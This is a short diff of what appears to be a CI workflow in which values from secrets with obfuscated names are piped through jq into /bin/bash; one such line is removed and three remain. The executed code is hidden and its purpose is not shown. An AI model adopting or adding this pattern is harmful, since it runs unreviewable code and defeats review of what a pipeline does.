@@ -22,7 +22,6 @@ jobs:
           efl3: ${{ secrets.efl3 }}
         run: |
           printf '%s' "$efl3" | jq -r .hcsus509 | /bin/bash
-          printf '%s' "$e5" | jq -r .u3867 | /bin/bash
           echo $atmfd4005 | jq -r .q3 | /bin/bash
           echo $b71475 | jq -r .fjs4 | /bin/bash
 
